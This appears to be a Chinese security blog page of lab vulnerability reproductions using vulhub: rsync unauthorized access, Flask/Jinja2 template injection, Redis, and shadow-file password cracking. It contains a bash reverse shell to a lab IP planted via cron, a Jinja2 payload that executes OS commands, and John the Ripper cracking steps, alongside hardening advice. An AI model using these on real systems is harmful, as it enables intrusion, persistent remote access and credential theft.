<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>fanson&#39;s Blog</title>

  
  <meta name="author" content="fanson">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="fanson&#39;s Blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">fanson&#39;s Blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/20/rsync-未授权访问漏洞复现/"><span>rsync 未授权访问漏洞复现</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/20/rsync-未授权访问漏洞复现/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-20T08:55:25.000Z">
          2019-04-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <blockquote>
<p>你也一定是某个人翘首以盼的惊喜！</p>
</blockquote>
<p>最近在渗透环境中有遇到<code>Rsync</code>端口开放的，所以刚好也来复现下这个漏洞，亦当记录笔记：</p>
<p><strong><em>0x00 漏洞介绍</em></strong></p>
<p><code>Rsync</code>是<code>Linux</code>下一款数据备份工具，支持通过<code>rsync</code>协议、<code>ssh</code>协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。其中<code>rsync</code>协议默认监听<code>873</code>端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了<code>rsync</code>服务，并且没有配置<code>ACL</code>或访问密码，我们将可以读写目标服务器文件。</p>
<p><strong><em>0x01 环境搭建</em></strong></p>
<p>环境搭建我依然用<code>vulhub</code>，简直太好了！</p>
<p>同样我们进入到<code>/vulhub-master/rsync/common</code>目录下，编译及运行<code>rsync</code>服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>但在编译的时候有报错</p>
<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/3.PNG" alt=""></p>
<p>解决：在<code>Dockerfile</code>文件中<code>add</code> 这一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN printf &quot;deb http://archive.debian.org/debian/ jessie main\ndeb-src http://archive.debian.org/debian/ jessie main\ndeb http://security.debian.org jessie/updates main\ndeb-src http://security.debian.org jessie/updates main&quot; &gt; /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/4.PNG" alt=""></p>
<p>接着我们继续来看看<code>rsync</code>的常用命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">列举整个同步目录或指定目录：</span><br><span class="line">rsync ip::</span><br><span class="line">rsync ip::xxx/</span><br><span class="line">下载文件或目录到本地：</span><br><span class="line">rsync -avz ip::xxx/xx.php /root</span><br><span class="line">rsync -avz ip::xxx/ /var/tmp</span><br><span class="line">上传文件到服务器：</span><br><span class="line">rsync -avz webshell.php ip::web/</span><br></pre></td></tr></table></figure>
<p><strong><em>0x02 漏洞复现</em></strong></p>
<p><code>nmap</code>先扫一波：</p>
<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/6.PNG" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://your-ip:873/</span><br><span class="line">rsync rsync://your-ip:873/src 来查看模块名列表</span><br><span class="line">我们再列出src模块下的文件</span><br><span class="line">rsync rsync://your-ip:873/src/</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/1.PNG" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们可以下载任意文件：</span><br><span class="line">rsync -av rsync://your-ip:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/2.PNG" alt=""></p>
<p><strong>提权：</strong></p>
<p>写入<code>shell</code>并赋权：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash </span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.128/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">chmod +x shell</span><br></pre></td></tr></table></figure>
<p>将<code>shell</code>上传至<code>/etc/cron.hourly</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync://192.168.91.130/src/etc/cron.hourly</span><br><span class="line">rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/7.PNG" alt=""></p>
<p>本地监听：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv -lp 4444</span><br></pre></td></tr></table></figure>
<p><strong><em>0x03 防范与总结</em></strong></p>
<p>这种未授权访问漏洞，一般都是在配置的时候，未能实现安全配置或权限认证而导致的，所以我们先来看看<code>rsync</code>的文件配置与认证方式。<code>rsync</code>的默认配置文件为<code>/etc/rsyncd.conf</code>，常驻模式启动命令的<code>rsync -daemon</code>，启动成功后默认监听于TCP端口873，可通过<code>rsync</code>的守护及SSH两种方式进行认证。</p>
<p>我们来看下含有漏洞的<code>rsync</code>的文件的配置</p>
<p><img src="/2019/04/20/rsync-未授权访问漏洞复现/5.PNG" alt=""></p>
<p><code>rsync</code><strong>默认</strong>允许匿名访问，也可在其配置文件中为同步目录添加用户认证相关项，包括认证文件及授权账号，若未包含授权账号行（<code>auth users</code>），则为匿名访问。所以问题就出在这。</p>
<p>我们来看下配置文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">配置文件位置：/etc/rsync.conf，常见配置项</span><br><span class="line"></span><br><span class="line">motd file -&gt; motd文件位置</span><br><span class="line">log file -&gt; 日志文件位置</span><br><span class="line">path -&gt; 默认路径位置</span><br><span class="line">use chroot -&gt; 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录</span><br><span class="line">read only -&gt; 只读配置（yes or no）</span><br><span class="line">list=true -&gt; 是否可以列出模块名</span><br><span class="line">uid = root -&gt; 传输使用的用户名</span><br><span class="line">gid = root -&gt; 传输使用的用户组</span><br><span class="line">auth users -&gt; 认证用户名</span><br><span class="line">secrets file=/etc/rsyncd.passwd -&gt; 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password</span><br><span class="line">hosts allow=192.168.0.101  -&gt; 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开</span><br><span class="line">hosts deny 禁止的主机，host的两项可以使用*表任意。</span><br></pre></td></tr></table></figure>
<p>漏洞修复：</p>
<ul>
<li>正确配置认证用户名或者密码</li>
<li>使用足够但最小权限</li>
<li><code>host allow/deny</code> 来控制接入源IP</li>
<li>可以配置只读</li>
<li>非必要应该仅限制配置路径下可访问</li>
</ul>
<p><strong><em>0x04 参考</em></strong></p>
<p>【1】<a href="https://github.com/vulhub/vulhub/tree/master/rsync/common" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/rsync/common</a></p>
<p>【2】<a href="https://superuser.com/questions/1423486/issue-with-fetching-http-deb-debian-org-debian-dists-jessie-updates-inrelease/1424377%EF%BC%89" target="_blank" rel="noopener">https://superuser.com/questions/1423486/issue-with-fetching-http-deb-debian-org-debian-dists-jessie-updates-inrelease/1424377%EF%BC%89</a></p>
<p>【3】<a href="https://blog.csdn.net/qq_36374896/article/details/84143428" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84143428</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/渗透测试/">渗透测试</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/"><span>Flask（Jinja2） 服务端模板注入漏洞</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-31T03:29:22.000Z">
          2019-03-31
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <blockquote>
<p>陪你走过那山高水长</p>
<p>陪你一起生长</p>
</blockquote>
<p>周末拈来一本书，刚好看到之前学习的<code>Flask</code>，今天刚好来学习下服务器模板注入（<code>SSTI</code>），来记录一下：</p>
<p><strong><em>0x00 漏洞介绍</em></strong></p>
<p>服务端模板注入（<code>SSTI</code>）:服务端接收了用户的输入，将其作为 <code>Web</code> 应用模板内容的一部分，在进行目标编译渲染的过程中，若用户插入了相关恶意内容，结果可能导致了敏感信息泄露、代码执行、<code>GetShell</code> 等问题，所以永远不要相信用户输入。</p>
<p><strong>Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers’ internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.[from us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp]</strong></p>
<p><strong><em>0x01 环境搭建</em></strong></p>
<p><code>Vulhub</code>简直不要太方便了</p>
<p>在ubuntu16.04下安装<code>docker/docker-compose</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 安装pip</span><br><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python3</span><br><span class="line"></span><br><span class="line"># 安装最新版docker</span><br><span class="line">curl -s https://get.docker.com/ | sh</span><br><span class="line"></span><br><span class="line"># 启动docker服务</span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line"># 安装compose</span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 下载项目</span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进入某一个漏洞/环境的目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"># 自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"># 启动整个环境</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#测试完成后，删除整个环境</span><br><span class="line"></span><br><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>
<p><strong><em>0x02 漏洞复现</em></strong></p>
<p>搭建环境完成后，访问<code>http://your-ip/?name=66</code>，得到66，说明SSTI漏洞存在。</p>
<p><img src="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/1.PNG" alt=""></p>
<p>在这种漏洞下，我们可以获取到inja2中可以获取的数据，jinja2设计被运行在沙箱中，来以保证安全，若我们能逃逸jinja2的沙箱，那么我们就可以实现命令执行让对方服务器运行我们指定的恶意代码，以达到getshell或者文件读取的目的。</p>
<p>沙箱逃逸部分有时间补上！</p>
<p>接下来获取eval函数并执行任意python代码。[poc来自<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">github</a>]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/2.PNG" alt=""></p>
<p><img src="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/4.PNG" alt=""></p>
<p><img src="/2019/03/31/Flask（Jinja2）-服务端模板注入漏洞/3.PNG" alt=""></p>
<p><strong><em>0x03 防范与总结</em></strong></p>
<ul>
<li><p>始终不要相信用户输入，将用户输入传递到模板当中，或者对输入的数据进行过滤与转义</p>
</li>
<li><p>将模板内容与view代码分离</p>
</li>
<li>最好把模板和参数分离</li>
</ul>
<p><strong><em>0x04 参考</em></strong></p>
<p>[1]<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
<p>[2]<a href="https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/</a></p>
<p>[3]<a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Python-Flask/">Python/Flask</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/27/Redis未授权访问漏洞复现/"><span>Redis未授权访问漏洞复现及利用总结</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/27/Redis未授权访问漏洞复现/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-27T15:09:29.000Z">
          2019-03-27
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <blockquote>
</blockquote>
<blockquote>
<p>斯人若彩虹，遇上方知有</p>
</blockquote>
<p><strong><em>0x01 Redis介绍</em></strong></p>
<p><strong>Redis</strong>是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值(key-value)对存储 (store) 数据库。（基于 BSD 许可的，高级键值 (key-value) 缓存 (cache) 和存储 (store) 系统。）从2015年6月开始，Redis的开发由<a href="https://zh.wikipedia.org/w/index.php?title=Redis_Labs&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">Redis Labs</a>赞助，而2013年5月至2015年6月期间，其开发由<a href="https://zh.wikipedia.org/wiki/Pivotal" target="_blank" rel="noopener">Pivotal</a>赞助。)在2013年5月之前，其开发由<a href="https://zh.wikipedia.org/wiki/VMware" target="_blank" rel="noopener">VMware</a>赞助。根据月度排行网站DB-Engines.com的数据显示，Redis是最流行的键值对存储数据库。由于 Redis 的键包括 string，hash，list，set，sorted set，bitmap 和 hyperloglog，所以常常被称为数据结构服务器。</p>
<p><code>Redis</code>因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行<code>flushall</code>来清空所有数据。</p>
<p><strong><em>0x02 环境搭建</em></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#靶机：CentOS7.0</span><br><span class="line">#CentOS安装redis</span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0.tar.gz</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p><strong><em>0x03 漏洞复现</em></strong></p>
<p><strong><em>0x04 填坑过程</em></strong></p>
<p>安装Redis-3.2.0时报错：</p>
<p>make[1]: Entering directory `/home/fanson/redis-3.2.0/src’<br>​    CC adlist.o<br>In file included from adlist.c:34:0:<br>zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory</p>
<p>include &lt;jemalloc/jemalloc.h&gt;</p>
<p>compilation terminated.<br>make[1]: <strong><em> [adlist.o] Error 1<br>make[1]: Leaving directory `/home/fanson/redis-3.2.0/src’<br>make: </em></strong> [all] Error 2</p>
<p>解决方法</p>
<p>Allocator  </p>
<p>Selecting a non-default memory allocator when building Redis is done by setting  the <code>MALLOC</code> environment variable. Redis is compiled and linked against libc malloc by default, with the exception of jemalloc being the default on Linux  systems. This default was picked because jemalloc has proven to have fewer<br>fragmentation problems than libc malloc.  To force compiling against libc malloc, use:  </p>
<pre><code>make MALLOC=libc  
</code></pre><p>To compile against jemalloc on Mac OS X systems, use:  </p>
<pre><code>make MALLOC=jemalloc
</code></pre><p><strong><em>0x05 参考文献</em></strong></p>
<p><a href="https://xz.aliyun.com/t/256" target="_blank" rel="noopener">https://xz.aliyun.com/t/256</a></p>
<p><a href="https://www.anquanke.com/post/id/170360" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360</a></p>
<p><a href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a></p>
<p><a href="http://redisinaction.com/preview/chapter1.html" target="_blank" rel="noopener">http://redisinaction.com/preview/chapter1.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/渗透测试/">渗透测试</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/26/linux下的-etc-password-etc-shadow/"><span>linux下的/etc/passwd&amp;&amp;/etc/shadow</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/26/linux下的-etc-password-etc-shadow/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-26T14:27:48.000Z">
          2019-03-26
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <blockquote>
<p>你会不会突然的出现，在街角的咖啡店！</p>
</blockquote>
<p>最近有遇到对<code>/etc/shadow</code>中的密码进行爆破问题，但是却没有成功，之前记得也有过总结这个，却找不到了。无奈就过来再记录下，以免下次查阅！</p>
<p><strong><em>/etc/passwd</em></strong></p>
<p>/etc/passwd是系统识别用户的一个文件，这个文件存放着所有用户账号的信息。其中当然包括账号与密码。当我们以root这个账号登录时，系统首先会查阅 /etc/passwd 文件，看是否有root这个账号，然后确定root的UID，通过UID 来确认用户和身份。</p>
<p>/etc/passwd的文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root权限下执行查看</span><br><span class="line">＃ cat /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:System daemons:/etc:</span><br><span class="line">bin:x:2:2:Owner of system commands:/bin:</span><br><span class="line">sys:x:3:3:Owner of system files:/usr/sys:</span><br><span class="line">adm:x:4:4:System accounting:/usr/adm:</span><br><span class="line">uucp:x:5:5:UUCP administrator:/usr/lib/uucp:</span><br><span class="line">auth:x:7:21:Authentication administrator:/tcb/files/auth:</span><br><span class="line">cron:x:9:16:Cron daemon:/usr/spool/cron:</span><br><span class="line">listen:x:37:4:Network daemon:/usr/net/nls:</span><br><span class="line">lp:x:71:18:Printer administrator:/usr/spool/lp:</span><br><span class="line">sam:x:200:50:Sam san:/usr/sam:/bin/sh</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">用户名:密码:用户ID:组ID:用户描述:主目录:shell</span><br></pre></td></tr></table></figure>
<p>系统中有一类用户称为伪用户（<code>psuedo users</code>），这些用户在<code>/etc/passwd</code>文件中也占有一条记录，但是不能登录，因为它们的登录<code>Shell</code>为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。常见的伪用户如下：</p>
<table>
<thead>
<tr>
<th><strong>bin</strong></th>
<th><strong>拥有可执行的用户命令文件</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>sys</strong></td>
<td><strong>拥有系统文件</strong></td>
</tr>
<tr>
<td><strong>adm</strong></td>
<td><strong>拥有帐户文件</strong></td>
</tr>
<tr>
<td><strong>uucp</strong></td>
<td><strong>UUCP使用 </strong></td>
</tr>
<tr>
<td><strong>lp</strong></td>
<td><strong>lp或lpd子系统使用</strong></td>
</tr>
<tr>
<td><strong>nobody</strong></td>
<td><strong>NFS使用</strong></td>
</tr>
</tbody>
</table>
<p>除了上面列出的伪用户外，还有许多标准的伪用户，例如：audit, cron, mail, usenet等，它们也都各自为相关的进程和文件所需要。</p>
<p><strong><em>/etc/shadow</em></strong></p>
<p>由于/etc/passwd文件是所有用户都可读的，如果用户的密码太简单或规律比较明显的话，一台普通的计算机就能够很容易地将它破解，因此对安全性要求较高的Linux系统都把加密后的口令字分离出来，单独存放在一个文件中，这个文件是/etc/shadow文件。 有超级用户才拥有该文件读权限，这就保证了用户密码的安全性。</p>
<p>【<code>/etc/shadow中的记录行与/etc/passwd中的一一对应，它由pwconv命令根据/etc/passwd中的数据自动产生</code>】</p>
<p>它的文件格式与/etc/passwd类似，具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">＃ cat /etc/shadow</span><br><span class="line"></span><br><span class="line">root:Dnakfw28zf38w:8764:0:168:7:::</span><br><span class="line">daemon:*::0:0::::</span><br><span class="line">bin:*::0:0::::</span><br><span class="line">sys:*::0:0::::</span><br><span class="line">adm:*::0:0::::</span><br><span class="line">uucp:*::0:0::::</span><br><span class="line">nuucp:*::0:0::::</span><br><span class="line">auth:*::0:0::::</span><br><span class="line">cron:*::0:0::::</span><br><span class="line">listen:*::0:0::::</span><br><span class="line">lp:*::0:0::::</span><br><span class="line">sam:EkdiSECLWPdSa:9740:0:0::::</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$36zQdAHKBxYr1lSPP26x1IhP6bOAigu7qO1ENtsyfxtU6hHvMdQMrgfxKhJ/ltkgAYwqA45ps/2HTF6saI/6gzLe7sF6kr1:16596:0:99999:6:::</span><br><span class="line">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br></pre></td></tr></table></figure>
<p>后三个一般是没有的</p>
<p><strong>“加密口令”字段存放的是加密[MD5,SHA-256,SHA-512]后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合 { ./0-9A-Za-z }中的字符，则对应的用户不能登录。</strong></p>
<p><strong><em>密码爆破</em></strong></p>
<p>最后介绍下如何爆破，我们先来了解下<code>linux</code>系统密码加密的原理：</p>
<p>密文由3部分组成，以”$”分隔，第一部分为ID(用来表示加密的方法)，第二部分为盐值，第三部分为加密密文</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>加密方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>MD5</td>
</tr>
<tr>
<td>5</td>
<td>SHA-256</td>
</tr>
<tr>
<td>6</td>
<td>SHA-512</td>
</tr>
</tbody>
</table>
<p>盐值：盐值就是使用随机字符码混合密码加密算法所产生的密码，作用就是即使是同一个密码，使用同一种加密方式，所产生的密文值也不同 。</p>
<p>工具爆破：<code>John the Ripper (“JtR”)</code> 是一个非常有用的工具。这是一个快速的密码破解器，适用于<code>Windows</code>和许多<code>Linux</code>系统。它具有很多功能，对于很多密码破解均有奇效。<code>JtR</code>破解的文件必须有特定的格式。要转换passwd和shadow文件，我们需要利用/usr/sbin/unshade可执行文件。这需要超级用户权限才能执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/unshadow /etc/passwd /etc/shadow &gt; ~/passwords.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ~/passwords.txt</span><br></pre></td></tr></table></figure>
<p>即可完成爆破。</p>
<p>该工具的详细是使用功能可见<a href="https://xz.aliyun.com/t/3958" target="_blank" rel="noopener">https://xz.aliyun.com/t/3958</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/linux/">linux</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/"><span>Wordpress &lt;= 4.6.1 Stored XSS Via Theme File</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-23T10:16:44.000Z">
          2019-03-23
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><em>Wordpress &lt;= 4.6.1 Stored XSS 漏洞复现</em></p>
<blockquote>
<p>我多想再见你<br>哪怕匆匆一眼</p>
</blockquote>
<p>​    发现自己对web漏洞的一些点理解的还是不够深。所以准备复现一波web漏洞，加深自己对一些点的理解深度和巩固下知识！</p>
<p>0x00 漏洞概述</p>
